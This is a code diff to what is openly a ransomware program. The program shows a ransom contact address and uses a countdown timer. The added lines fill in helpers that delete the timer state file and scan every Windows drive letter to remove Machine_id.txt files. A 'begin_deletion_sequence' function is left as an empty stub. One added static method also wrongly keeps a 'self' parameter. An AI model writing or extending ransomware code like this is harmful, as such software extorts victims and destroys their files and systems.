@@ -1038,6 +1038,7 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             file.write(str(self.closingTime.timestamp()))
         self.update_timer()
 
+
     # Step 51: Function to resting the timer state
     def reset_timer_state(self):
         with open(TIMER_STATE_FILE, 'w') as file:
@@ -1045,17 +1046,41 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         self.timerLabel.config(text="No Active Countdown.")
 
 
+    #Step 52: Function to delete the timer state file
+    @staticmethod
+    def delete_timer_state_file():
+        try:
+            # Delete the timer state file
+            remove(TIMER_STATE_FILE)
+        except FileNotFoundError:
+            pass
 
-    # Step 51: Function to reset the timer state
-    def delete_timer_state_file(self):
-        pass
-
-
+    # Step 53: Function to delete the timer and machine ID files
+    @staticmethod
     def delete_timer_and_machine_id_files(self):
-        pass
+        try:
+            remove(TIMER_STATE_FILE)
+        except FileNotFoundError:
+            pass
 
+        # get existing derives in the target machine
+        drives = [f"{x}:\\" for x in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if path.exists(f"{x}:\\")]
+
+        # Iterate on each drive
+        for drive in drives:
+            # get Machine_id.txt path
+            machineIdPath = path.join(drive, "Machine_id.txt")
+            try:
+                remove(machineIdPath)
+            except FileNotFoundError:
+                pass
+
+    # Step 54: Function to begin the deletion sequence
     def begin_deletion_sequence(self):
         pass
+
+
+
 
 
 
